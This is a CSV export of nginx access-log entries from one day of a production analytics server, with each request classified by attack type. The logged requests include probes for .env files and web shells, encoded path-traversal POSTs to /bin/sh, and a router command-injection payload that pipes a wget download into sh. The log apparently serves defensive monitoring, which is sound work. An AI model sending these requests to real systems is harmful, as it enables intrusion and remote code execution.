Stream Name,Client IP,Attack Type,Method,Request Path,Status Code,Raw Log
_nginx_access_log_Analytics_PROD_Lapine,185.198.37.177,Environment File,GET,/.env HTTP/1.1,301,"185.198.37.177 - - [15/Mar/2026:07:13:47 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,185.91.69.217,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"185.91.69.217 - - [15/Mar/2026:07:40:36 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,103.40.61.98,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"103.40.61.98 - - [15/Mar/2026:07:43:18 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,82.24.217.239,Environment File,GET,/.env HTTP/1.1,404,"82.24.217.239 - - [15/Mar/2026:07:47:05 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,107.174.128.134,Environment File,GET,/.env HTTP/1.1,301,"107.174.128.134 - - [15/Mar/2026:08:24:01 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,45.61.122.243,Environment File,GET,/.env HTTP/1.1,404,"45.61.122.243 - - [15/Mar/2026:08:34:08 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,23.95.250.120,Environment File,GET,/.env HTTP/1.1,301,"23.95.250.120 - - [15/Mar/2026:11:02:10 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,46.203.154.158,Environment File,GET,/.env HTTP/1.1,404,"46.203.154.158 - - [15/Mar/2026:12:22:59 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,110.35.80.116,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"110.35.80.116 - - [15/Mar/2026:12:41:55 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,110.35.80.116,Info Disclosure,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1,400,"110.35.80.116 - - [15/Mar/2026:12:41:55 +0000] ""POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,34.158.79.105,Environment File,GET,/.env HTTP/1.1,400,"34.158.79.105 - - [15/Mar/2026:13:06:34 +0000] ""GET /.env HTTP/1.1"" 400 650 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"""
_nginx_access_log_Analytics_PROD_Lapine,221.159.119.6,Info Disclosure,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1,301,"221.159.119.6 - - [15/Mar/2026:14:16:42 +0000] ""GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,221.159.119.6,Info Disclosure,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1,301,"221.159.119.6 - - [15/Mar/2026:14:16:42 +0000] ""GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%20http%3A//0.0.0.0/router.tplink.sh%20-O-%7Csh) HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,185.72.240.12,Environment File,GET,/.env HTTP/1.1,301,"185.72.240.12 - - [15/Mar/2026:14:45:33 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,101.36.104.242,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"101.36.104.242 - - [15/Mar/2026:14:45:44 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,142.111.150.165,Environment File,GET,/.env HTTP/1.1,301,"142.111.150.165 - - [15/Mar/2026:15:39:02 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Shell Upload,GET,/prv8shell.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:06:45 +0000] ""GET /prv8shell.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Shell Upload,GET,/prv8shell.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:06:45 +0000] ""GET /prv8shell.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,/wp-content/admin.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:06:53 +0000] ""GET /wp-content/admin.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,/wp-content/admin.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:06:53 +0000] ""GET /wp-content/admin.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//wp-admin/images/wp-conflg.php?p= HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:06:54 +0000] ""GET //wp-admin/images/wp-conflg.php?p= HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//wp-admin/images/wp-conflg.php?p= HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:06:54 +0000] ""GET //wp-admin/images/wp-conflg.php?p= HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,/wp-admin/css/bolt.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:06:57 +0000] ""GET /wp-admin/css/bolt.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,/wp-admin/css/bolt.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:06:57 +0000] ""GET /wp-admin/css/bolt.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//wp-content/admin.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:06:59 +0000] ""GET //wp-content/admin.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//wp-content/admin.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:06:59 +0000] ""GET //wp-content/admin.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//adminfuns.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:06:59 +0000] ""GET //adminfuns.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//adminfuns.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:06:59 +0000] ""GET //adminfuns.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Info Disclosure,GET,//cgi-bin/index.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:07:00 +0000] ""GET //cgi-bin/index.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Info Disclosure,GET,//cgi-bin/index.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:07:00 +0000] ""GET //cgi-bin/index.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//wp-admin/js/widgets/index.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:07:03 +0000] ""GET //wp-admin/js/widgets/index.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,//wp-admin/js/widgets/index.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:07:03 +0000] ""GET //wp-admin/js/widgets/index.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,/wp-admin/js/fi.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:07:03 +0000] ""GET /wp-admin/js/fi.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Admin Panel Scan,GET,/wp-admin/js/fi.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:07:03 +0000] ""GET /wp-admin/js/fi.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Shell Upload,GET,/alfashell.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:07:07 +0000] ""GET /alfashell.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Shell Upload,GET,/alfashell.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:07:07 +0000] ""GET /alfashell.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Info Disclosure,GET,/gettest.php HTTP/1.1,301,"20.151.11.236 - - [15/Mar/2026:16:07:08 +0000] ""GET /gettest.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.151.11.236,Info Disclosure,GET,/gettest.php HTTP/1.1,404,"20.151.11.236 - - [15/Mar/2026:16:07:08 +0000] ""GET /gettest.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,92.118.112.178,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"92.118.112.178 - - [15/Mar/2026:17:02:48 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,102.22.20.125,Config File Access,GET,/admin/config.php HTTP/1.0,301,"102.22.20.125 - - [15/Mar/2026:17:32:50 +0000] ""GET /admin/config.php HTTP/1.0"" 301 162 ""-"" ""xfa1"""
_nginx_access_log_Analytics_PROD_Lapine,31.59.10.80,Environment File,GET,/.env HTTP/1.1,404,"31.59.10.80 - - [15/Mar/2026:17:33:53 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,206.206.73.107,Environment File,GET,/.env HTTP/1.1,301,"206.206.73.107 - - [15/Mar/2026:20:50:38 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,217.154.69.208,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"217.154.69.208 - - [15/Mar/2026:21:31:58 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,161.123.209.83,Environment File,GET,/.env HTTP/1.1,404,"161.123.209.83 - - [15/Mar/2026:21:41:43 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,173.211.69.56,Environment File,GET,/.env HTTP/1.1,301,"173.211.69.56 - - [15/Mar/2026:22:07:12 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,82.21.244.39,Environment File,GET,/.env HTTP/1.1,404,"82.21.244.39 - - [15/Mar/2026:22:57:09 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
